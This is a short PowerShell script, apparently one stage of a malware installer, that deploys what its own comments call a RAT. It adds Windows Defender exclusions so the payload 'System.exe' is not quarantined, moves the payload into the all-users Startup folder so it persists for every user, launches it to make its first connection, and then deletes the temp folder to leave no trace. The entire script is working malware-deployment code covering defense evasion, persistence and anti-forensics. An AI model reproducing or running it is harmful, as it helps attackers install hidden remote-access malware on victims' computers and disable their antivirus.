# 1. Sets the path to the temp folder where Lua put the files
$tempDir = "$env:TEMP\rt"
$exePath = "$tempDir\System.exe"
$startupPath = "$env:ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\System.exe"

# 2. Adds Defender Exclusions (Requires Admin)
#    Without this, Defender might quarantine System.exe the moment it's moved.
Add-MpPreference -ExclusionPath $tempDir
Add-MpPreference -ExclusionPath $startupPath
Add-MpPreference -ExclusionProcess "System.exe"

# 3. Moves the malware to a persistent location (Requires Admin)
#    ProgramData is visible to all users, so the RAT runs for everyone.
Move-Item -Path $exePath -Destination $startupPath -Force

# 4. Runs the malware once (Requires Admin)
#    Ensures the binary works and establishes its initial connection.
Start-Process $startupPath -Wait

# 5. Cleans up the temp folder (Requires Admin)
#    Deletes P1, P2, and the original System.exe to leave no trace in %TEMP%.
Start-Process powershell -ArgumentList "-NoProfile -Command `"Start-Sleep -Seconds 5; Remove-Item -Recurse -Force '$tempDir'`""
